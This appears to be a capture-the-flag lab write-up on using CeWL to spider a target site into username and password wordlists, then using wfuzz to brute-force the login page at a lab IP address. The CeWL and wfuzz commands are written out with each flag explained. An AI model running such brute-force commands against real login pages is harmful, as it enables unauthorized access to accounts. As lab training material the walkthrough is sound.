---
layout: single
title: "[Day 4] Brute-forcing Baby, it's CeWLd outside "
header:
  teaser: "/assets/images/hacking-teaser.JPG"
---

# Day 4

# Theory - CeWL tool
CeWL (pronounced "cool") is a custom word list generator tool that spiders websites to create word lists based on the site's content.


# Challenge

## cewl
```
# Spider over the website
cewl -d 2 -m 5 -w passwords.txt http://10.10.105.114 --with-numbers

# This might give us some usernames
cewl -d 0 -m 5 -w usernames.txt http://10.10.105.114/team.php --lowercase
```

* -d for depth while spider the target
* -w output file
* -m generate password with mininum length of 5

## wfuzz
Web fuzzer can be used to bruteforce the login page with the outcome of cewl.

```
wfuzz -c -z file,usernames.txt -z file,passwords.txt --hs "Please enter the correct credentials" -u http://10.10.105.114/login.php -d "username=FUZZ&password=FUZ2Z"
```

* -z file,usernames.txt loads the usernames list.
* -z file,passwords.txt uses the password list generated by CeWL.
* --hs "Please enter the correct credentials" hides responses containing the string "Please enter the correct credentials", which is the message displayed for wrong login attempts.
* -u specifies the target URL.
* -d "username=FUZZ&password=FUZ2Z" provides the POST data format where FUZZ will be replaced by usernames and FUZ2Z by passwords.





